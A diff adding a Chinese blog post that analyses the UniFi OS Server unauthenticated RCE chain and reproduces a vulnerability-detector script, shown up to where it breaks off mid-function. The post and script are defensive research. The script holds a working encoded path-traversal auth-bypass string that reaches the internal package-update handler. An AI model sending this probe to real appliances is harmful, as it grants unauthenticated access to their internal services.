@@ -1,0 +1,464 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<!-- Head tag -->
+<head>
+
+    
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="theme-color" content="#050310">
+    <meta name="color-scheme" content="dark">
+    <link rel="canonical" href="https://xxinggod.click/research/UniFi-OS-%E6%9C%AA%E6%8E%88%E6%9D%83-RCE-%E9%93%BE%E5%88%86%E6%9E%90/">
+    <meta name="signal:search" content="/search.json">
+
+    <!--Description-->
+    
+        <meta name="description" content="Binary Researcher">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Starlight">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="UniFi OS 未授权 RCE 链分析"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="Binary Researcher" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Starlight&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    
+        <meta name="twitter:card" content="summary" />
+    
+    
+    
+
+    <!-- Title -->
+    
+    <title>UniFi OS 未授权 RCE 链分析 - Starlight&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS (local) -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Font Awesome (local) -->
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <!-- Gallery (local) -->
+    <link rel="stylesheet" href="/css/featherlight.min.css">
+
+    <!-- Web Fonts (local) -->
+    <link rel="stylesheet" href="/css/fonts.css">
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Google Analytics -->
+    
+
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body id="top" class="page-type-post title-style-clean is-article">
+
+<a class="skip-link" href="#main-content">SKIP_TO_CONTENT</a>
+<div class="site-noise" aria-hidden="true"></div>
+
+<div class="site-frame">
+    <!-- Terminal Header -->
+    <!-- Terminal Header: Window bar + nav row -->
+
+<header class="site-header">
+    <div class="window-bar">
+        <a class="window-title" href="/">
+            <span class="window-title__system">SECURITY RESEARCH LOG</span>
+            <span class="window-title__divider">·</span>
+            <span class="window-title__name">Starlight's blog</span>
+        </a>
+        <div class="window-status">
+            <span class="status-led" aria-hidden="true"></span>
+            <span class="window-status__host">XXINGGOD.CLICK</span>
+        </div>
+    </div>
+    <div class="nav-row">
+        <a class="site-mark" href="/">
+            <span class="site-mark__bracket">[</span><span>STAR</span><span class="site-mark__slash">/</span><span class="site-mark__bracket">]</span>
+        </a>
+        <button class="nav-toggle terminal-button" type="button" data-nav-toggle aria-controls="site-nav" aria-expanded="false">
+            <span class="nav-toggle__label">MENU</span>
+            <span class="nav-toggle__glyph" aria-hidden="true">[+]</span>
+        </button>
+        <nav id="site-nav" class="site-nav" data-site-nav aria-label="Main navigation">
+            
+            <a href="/" data-nav-link><span class="nav-prompt">./</span>HOME</a>
+            
+            <a href="/archives" data-nav-link><span class="nav-prompt">./</span>ARCHIVE</a>
+            
+            <a href="/about/" data-nav-link><span class="nav-prompt">./</span>ABOUT</a>
+            
+            <a href="/tags" data-nav-link><span class="nav-prompt">./</span>TAGS</a>
+            
+            <a href="/categories" data-nav-link><span class="nav-prompt">./</span>CATEGORIES</a>
+            
+            <a href="/link/" data-nav-link><span class="nav-prompt">./</span>LINKS</a>
+            
+        </nav>
+        
+            <button class="search-trigger terminal-button" type="button" data-search-open aria-label="SEARCH">
+                <span class="search-trigger__key">⌘K</span>
+                <span>SEARCH</span>
+            </button>
+        
+    </div>
+</header>
+
+
+    <main id="main-content" class="site-main" tabindex="-1">
+        <!-- Main Content -->
+        <div class="container">
+            <section class="main">
+    
+
+<div class="reading-progress" aria-hidden="true"></div>
+
+<article class="article-page">
+    <header class="article-header" id="article-header">
+        <div class="article-header__protocol">
+            <span>// RESEARCH_TRANSMISSION</span>
+            <span>ID: UNIFI_OS_RCE</span>
+        </div>
+
+        <h1>UniFi OS 未授权 RCE 链分析</h1>
+
+        
+            <p class="article-deck">UniFi OS三连CVSS10.0分析</p>
+        
+
+        <div class="article-meta">
+            
+                <div>
+                    <span>PUBLISHED</span>
+                    <time datetime="2026-08-28T09:45:00.000Z">2026.08.28</time>
+                </div>
+            
+            <div>
+                <span>READ_TIME</span>
+                <strong>41 MIN</strong>
+            </div>
+            <div>
+                <span>PAYLOAD</span>
+                <strong>20,164 CHAR</strong>
+            </div>
+            
+                <div>
+                    <span>CHANNEL</span>
+                    <a href="/categories/CVE/">CVE</a>
+                </div>
+            
+        </div>
+
+        
+            <div class="article-tags">
+                <span class="article-tags__label">// INDICATORS</span>
+                
+                    <a class="chip" href="/tags/IOT/">IOT</a>
+                
+                    <a class="chip" href="/tags/CVE/">CVE</a>
+                
+                    <a class="chip" href="/tags/UniFi/">UniFi</a>
+                
+                    <a class="chip" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+                
+            </div>
+        
+
+        
+
+    </header>
+
+    <div class="article-layout ">
+        <div class="article-content" data-article-content>
+            <div class="article-content__start">
+                <span>BEGIN_PAYLOAD</span>
+                <span>20260828</span>
+            </div>
+
+            
+
+            <h2 id="背景信息"><a href="#背景信息" class="headerlink" title="背景信息"></a>背景信息</h2><p>UniFi OS 服务器是 Ubiquiti 提供的 UniFi OS 软件版本。UniFi OS 是一款管理平台，负责协调 UniFi 系列应用程序的工作——包括网络管理、安全保护，以及身份识别和更新服务等功能。该服务器由一系列本地主机上的后端服务组成，这些服务通过 Nginx 前端进行连接。Nginx 负责终止 TLS 通信，验证请求内容，并将这些请求转发到相应的内部服务。正是这一代理功能至关重要：整个安全机制依赖于 Nginx 能够准确判断哪些请求是公开的，哪些需要身份验证。</p>
+<p>2026 年 5 月 21 日，Ubiquiti 发布了安全公告 064（SAB-064），其中提到了 UniFi 操作系统设备系列存在的五个漏洞。对于未经认证的攻击者来说，最值得关注的三个漏洞分别是：认证网关中的访问控制缺陷和路径遍历漏洞（CVE-2026-34908 和 CVE-2026-34909，这两个漏洞的 CVSS 评分均为 10.0，属于严重级别；攻击向量分别为 <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</code> 和 <code>package-update</code> ）。此外，还有 <code>package-update</code> 服务中的输入验证缺陷（命令注入漏洞，CVE-2026-34910），该漏洞的 CVSS 评分同样为 10.0，攻击向量与之前的两个漏洞相同。综合这三个漏洞，攻击者就可以实现未经认证的命令执行了。公告指出，访问控制缺陷的幕后主谋是 Duc Anh Nguyen（@heckintosh_），路径遍历漏洞的提出者是 Catchify Security 的 Abdulaziz Almadhi，而命令注入漏洞的提出者则是 John Carroll。</p>
+<p>在这篇文章中，我们重点关注未经验证的数据链（CVE-2026-34908、CVE-2026-34909 以及 CVE-2026-34910）。因为攻击者可以在没有认证信息的情况下发起攻击的目标。</p>
+<h2 id="受影响UniFi-OS硬件-软件版本"><a href="#受影响UniFi-OS硬件-软件版本" class="headerlink" title="受影响UniFi OS硬件&amp;软件版本"></a>受影响UniFi OS硬件&amp;软件版本</h2><p>UniFi OS Server软件版本≤5.0.6（unifi-core内核5.0.126）存在完整攻击链；5.0.8（内核5.0.153）彻底封堵三条漏洞入口。<br>各硬件固定受影响基线：</p>
+<ol>
+<li>Cloud Gateway&#x2F;Dream Machine全系列（Pro&#x2F;SE&#x2F;Beast）：固件低于5.1.12高危</li>
+<li>UniFi Protect NVR&#x2F;UNVR：固件低于5.1.10高危</li>
+<li>UniFi Access门禁主机、Talk语音网关：同5.1.12基线</li>
+<li>UniFi Express一体化设备：低于4.0.14高危</li>
+<li>UNAS网络存储、交换机控制器模块：同步受内核漏洞影响</li>
+</ol>
+<h3 id="UniFi-OS底层架构：Nginx-unifi-core分层模型"><a href="#UniFi-OS底层架构：Nginx-unifi-core分层模型" class="headerlink" title="UniFi OS底层架构：Nginx+unifi-core分层模型"></a>UniFi OS底层架构：Nginx+unifi-core分层模型</h3><p>UniFi OS采用反向代理+微服务分层架构，所有前端请求统一经过Nginx转发，身份校验逻辑独立抽离为unifi-core Node.js服务，内部拆分多业务Go子服务：网络管理、视频录像、门禁、系统包更新。</p>
+<p><img src="/img/UniFi-OS-%E6%9C%AA%E6%8E%88%E6%9D%83-RCE-%E9%93%BE%E5%88%86%E6%9E%90/image-20260827235308279.png" alt="image-20260827235308279"></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>通过如下链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.ui.com/download/software/unifi-os-server">https://www.ui.com/download/software/unifi-os-server</a></p>
+<p>选择<em>UniFi OS</em> &lt;&#x3D;5.0.6以下的版本，我这里选择<strong>4.3.6</strong>版本，会有更新可能就到了patch的版本。</p>
+<p>下载完之后，是一个可执行文件，添加执行权限，使用sudo权限运行。</p>
+<p>这个UniFi OS是通过<code>podman</code>这个容器管理软件进行一个管理，需要先进行安装。</p>
+<p>安装完之后启动</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./2f3a-linux-x64-4.3.6-be3b4ae0-6bcd-435d-b893-e93da668b9d0.6-x64</span><br></pre></td></tr></table></figure>
+
+<p>启动成功之后，会在本地开放一个<code>11443</code>端口，来访问后台管理。</p>
+<p>访问后台会进行一系列的初始化操作，当设置完之后，再次访问就如下界面：</p>
+<p><img src="/img/UniFi-OS-%E6%9C%AA%E6%8E%88%E6%9D%83-RCE-%E9%93%BE%E5%88%86%E6%9E%90/image-20260827233225888.png" alt="image-20260827233225888"></p>
+<p>到这里之后就搭建完成了。</p>
+<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>使用<code>Bishop Fox</code>官方开源检测工具，仅发送无害探测包，不会执行注入命令，支持单目标、批量文件扫描、JSON导出报告。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/BishopFox/CVE-2026-34908-check">https://github.com/BishopFox/CVE-2026-34908-check</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># cve_2026_34908_check.py</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Safe detector for the UniFi OS Server &lt;= 5.0.6 unauthenticated RCE chain</span></span><br><span class="line"><span class="comment"># (Ubiquiti Security Advisory Bulletin 064):</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   * CVE-2026-34908 / CVE-2026-34909 — auth-gateway bypass (improper access</span></span><br><span class="line"><span class="comment">#     control / path traversal). The auth subrequest treats any request whose</span></span><br><span class="line"><span class="comment">#     RAW URI starts with &quot;/api/auth/validate-sso/&quot; as public, but nginx routes</span></span><br><span class="line"><span class="comment">#     by the NORMALIZED URI (it decodes %2f -&gt; &quot;/&quot; and collapses &quot;../&quot;). Encoding</span></span><br><span class="line"><span class="comment">#     a traversal makes those diverge, granting unauthenticated access to internal</span></span><br><span class="line"><span class="comment">#     &quot;/proxy/&lt;service&gt;/&quot; backends.</span></span><br><span class="line"><span class="comment">#   * CVE-2026-34910 — unauthenticated command injection reached via the bypass.</span></span><br><span class="line"><span class="comment">#     CVE-2026-33000 is the same sink reached with a valid token instead of bypass.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Fixed in UniFi OS Server 5.0.8.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Produced by Bishop Fox Team X and released for defensive use. Use only against</span></span><br><span class="line"><span class="comment"># systems you are authorized to test.</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Detection methodology — non-destructive behavioral probing (no command is ever run).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Per target the detector sends up to three plain GETs: a baseline control, the</span></span><br><span class="line"><span class="string">auth-bypass probe, and (only when the result is otherwise unclassifiable) a</span></span><br><span class="line"><span class="string">root-page UniFi OS fingerprint. The core check exercises the auth-bypass primitive</span></span><br><span class="line"><span class="string">against the vulnerable endpoint. On a vulnerable host, that request:</span></span><br><span class="line"><span class="string">    - passes nginx auth (the RAW URI is treated as the public</span></span><br><span class="line"><span class="string">      &quot;/api/auth/validate-sso/&quot; prefix), and</span></span><br><span class="line"><span class="string">    - is routed to the internal package-update handler (the NORMALIZED path</span></span><br><span class="line"><span class="string">      collapses onto &quot;/proxy/users/api/v2/ucs/update/latest_package&quot;),</span></span><br><span class="line"><span class="string">which then rejects the missing parameter (&quot;query param pkg_name required&quot;).</span></span><br><span class="line"><span class="string">We therefore confirm both the auth bypass and that the vulnerable handler is</span></span><br><span class="line"><span class="string">reachable without sending a command injection payload.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Response classification:</span></span><br><span class="line"><span class="string">    HTTP 200 + handler error markers -&gt; VULNERABLE   (bypass reached the sink handler)</span></span><br><span class="line"><span class="string">    HTTP 400                          -&gt; PATCHED      (5.0.8 nginx rejects the divergence)</span></span><br><span class="line"><span class="string">    HTTP 401, UniFi OS fingerprint    -&gt; INCONCLUSIVE (bypass blocked / auth enforced)</span></span><br><span class="line"><span class="string">    HTTP 401, no fingerprint          -&gt; UNAFFECTED   (not a UniFi OS Server)</span></span><br><span class="line"><span class="string">    anything else, no fingerprint     -&gt; UNAFFECTED   (not a UniFi OS Server)</span></span><br><span class="line"><span class="string">    anything else, UniFi OS present   -&gt; INCONCLUSIVE (UniFi OS, but unexpected response)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INCONCLUSIVE covers two confirmed-UniFi-OS cases that the verdict&#x27;s detail string</span></span><br><span class="line"><span class="string">distinguishes: (1) the bypass was blocked / auth enforced (HTTP 401) — not confirmed</span></span><br><span class="line"><span class="string">vulnerable, verify the version manually; and (2) the probe returned an unexpected</span></span><br><span class="line"><span class="string">response that fits no known pattern. Both warrant human review.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A baseline request to the same endpoint WITHOUT the bypass is also sent and must</span></span><br><span class="line"><span class="string">return 401; this guards against false positives on open/misconfigured instances.</span></span><br><span class="line"><span class="string">Whenever the probe does not positively confirm vulnerable or patched, the detector</span></span><br><span class="line"><span class="string">fingerprints the root page (the same surface the nuclei UOS templates match) before</span></span><br><span class="line"><span class="string">reporting a not-vulnerable verdict: only hosts that carry the UniFi OS portal markers</span></span><br><span class="line"><span class="string">are reported INCONCLUSIVE; hosts without the markers are reported UNAFFECTED (not a</span></span><br><span class="line"><span class="string">UniFi OS Server at all).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The probe tests the vulnerable behavior directly: a positive verdict means the auth</span></span><br><span class="line"><span class="string">bypass actually reached the sink on the live target.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Exit status: 1 if any target is VULNERABLE, else 0 (argparse usage errors exit 2).</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit</span><br><span class="line"></span><br><span class="line">DEFAULT_PORT = <span class="number">11443</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- non-exploit probes ------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Auth-bypass primitive. <span class="doctag">NOTE:</span> contains NO `pkg_name`, NO `by_cmd`, and NO shell</span></span><br><span class="line"><span class="comment"># metacharacters -&gt; the vulnerable handler errors on the missing parameter before</span></span><br><span class="line"><span class="comment"># any command string is constructed. Reaching it proves the bug without running it.</span></span><br><span class="line">BYPASS_PROBE = (</span><br><span class="line">    <span class="string">&quot;/api/auth/validate-sso/..%2f..%2f..%2f&quot;</span></span><br><span class="line">    <span class="string">&quot;proxy/users/api/v2/ucs/update/latest_package&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The same endpoint WITHOUT the bypass. Must be 401 on a sane host (false-positive guard).</span></span><br><span class="line">BASELINE = <span class="string">&quot;/proxy/users/api/v2/ucs/update/latest_package&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Markers that identify the vulnerable handler&#x27;s own &quot;missing parameter&quot; response,</span></span><br><span class="line"><span class="comment"># i.e. proof we landed on the package-update handler (not the SPA or another route).</span></span><br><span class="line">VULN_HANDLER_MARKERS = (<span class="string">&quot;pkg_name&quot;</span>, <span class="string">&quot;CODE_SYSTEM_ERROR&quot;</span>, <span class="string">&quot;parameters are invalid&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Root-page markers that positively identify the UniFi OS management portal. Used</span></span><br><span class="line"><span class="comment"># only to tell &quot;not a UniFi OS Server at all&quot; (UNAFFECTED) apart from &quot;UniFi OS</span></span><br><span class="line"><span class="comment"># present but unclassifiable&quot;.</span></span><br><span class="line">UOS_FINGERPRINT_MARKERS = (</span><br><span class="line">    <span class="string">&quot;&lt;title&gt;UniFi OS&lt;/title&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;window.UNIFI_OS_MANIFEST&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;id=&quot;portal-root&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;id=&quot;site-manager_portal-container&quot;&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- terminal colour ---------------------------------------------------------</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ansi</span>:</span><br><span class="line">    RESET = <span class="string">&quot;\033[0m&quot;</span></span><br><span class="line">    BOLD = <span class="string">&quot;\033[1m&quot;</span></span><br><span class="line">    DIM = <span class="string">&quot;\033[2m&quot;</span></span><br><span class="line">    RED = <span class="string">&quot;\033[31m&quot;</span></span><br><span class="line">    GREEN = <span class="string">&quot;\033[32m&quot;</span></span><br><span class="line">    YELLOW = <span class="string">&quot;\033[33m&quot;</span></span><br><span class="line">    BLUE = <span class="string">&quot;\033[34m&quot;</span></span><br><span class="line">    MAGENTA = <span class="string">&quot;\033[35m&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># verdict -&gt; (marker, ansi-style)</span></span><br><span class="line">VERDICT_STYLE = &#123;</span><br><span class="line">    <span class="string">&quot;VULNERABLE&quot;</span>: (<span class="string">&quot;[!]&quot;</span>, Ansi.BOLD + Ansi.RED),</span><br><span class="line">    <span class="string">&quot;PATCHED&quot;</span>: (<span class="string">&quot;[+]&quot;</span>, Ansi.GREEN),</span><br><span class="line">    <span class="string">&quot;UNAFFECTED&quot;</span>: (<span class="string">&quot;[-]&quot;</span>, Ansi.DIM),</span><br><span class="line">    <span class="string">&quot;INCONCLUSIVE&quot;</span>: (<span class="string">&quot;[?]&quot;</span>, Ansi.YELLOW),</span><br><span class="line">    <span class="string">&quot;ERROR&quot;</span>: (<span class="string">&quot;[x]&quot;</span>, Ansi.MAGENTA),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">want_color</span>(<span class="params">flag_no_color: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Honour --no-color, the NO_COLOR convention, and non-TTY output.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> flag_no_color <span class="keyword">or</span> os.environ.get(<span class="string">&quot;NO_COLOR&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> sys.stdout.isatty()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">paint</span>(<span class="params">text: <span class="built_in">str</span>, style: <span class="built_in">str</span>, enabled: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;style&#125;</span><span class="subst">&#123;text&#125;</span><span class="subst">&#123;Ansi.RESET&#125;</span>&quot;</span> <span class="keyword">if</span> enabled <span class="keyword">else</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- HTTP --------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">host, port, target, timeout, max_bytes=<span class="number">4096</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Issue one GET with an UN-normalized request-target.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    `http.client` sends the path verbatim, which is required so the literal</span></span><br><span class="line"><span class="string">    &quot;..%2f&quot; survives to the server (libraries like `requests` would re-normalize</span></span><br><span class="line"><span class="string">    or re-encode it). TLS verification is disabled because these appliances ship</span></span><br><span class="line"><span class="string">    self-signed certificates. Returns (status, content_type, body_text).</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ctx = 